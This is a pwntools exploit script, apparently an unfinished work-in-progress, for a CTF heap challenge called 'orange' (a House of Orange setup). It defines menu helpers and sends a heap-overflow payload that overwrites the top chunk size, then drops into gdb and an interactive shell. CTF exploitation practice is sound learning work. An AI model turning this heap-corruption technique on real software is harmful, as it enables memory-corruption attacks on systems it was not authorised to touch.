from pwn import *
from ctypes import *
context(os='linux', arch='amd64')
p = process('./orange')
# p = remote('node4.buuoj.cn', 27107)
elf = ELF('./orange')
lib = ELF('../../pwn/libc/u16/libc-2.23-64.so')


def choice(id_):
    p.recvuntil(b'Your choice :')
    p.sendline(id_)


def add(size_, mess, price, color):
    choice(b'1')
    p.recvuntil(b'Length of name :')
    p.sendline(size_)
    p.recvuntil(b'Name')
    p.send(mess)
    p.recvuntil(b'Price of Orange:')
    p.sendline(price)
    p.recvuntil(b'Color of Orange:')
    p.sendline(color)


def show():
    choice(b'2')


def edit(size_, mess, price, color):
    choice(b'3')
    p.recvuntil(b'Length of name :')
    p.sendline(size_)
    p.recvuntil(b'Name:')
    p.send(mess)
    p.recvuntil(b'Price of Orange:')
    p.sendline(price)
    p.recvuntil(b'Color of Orange:')
    p.sendline(color)


add(b'16', b'a' * 16, b'12', b'56746')
payload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0xf80)
edit(b'128', payload, b'12', b'56746')
add(b'128', b'a' * 16, b'12', b'56746')
gdb.attach(p)
# p.sendline(b'cat flag')
p.interactive()
